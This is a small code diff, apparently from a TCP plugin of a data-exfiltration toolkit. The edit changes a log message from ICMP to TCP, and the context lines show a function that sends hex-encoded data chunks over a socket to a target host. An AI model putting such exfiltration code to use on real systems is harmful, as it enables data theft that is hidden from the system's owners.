@@ -18,7 +18,7 @@ def send(data):
     
     packet_index = data.split('|!|')[1]
     app_exfiltrate.log_message(
-        'info', "[icmp] Sending {0} bytes with ICMP packet to {1}. PacketIndex = {2}".format(len(data), target, packet_index))
+        'info', "[tcp] Sending {0} bytes with TCP packet to {1}. PacketIndex = {2}".format(len(data), target, packet_index))
     
     client_socket.connect((target, port))
     client_socket.send(data.encode('hex'))
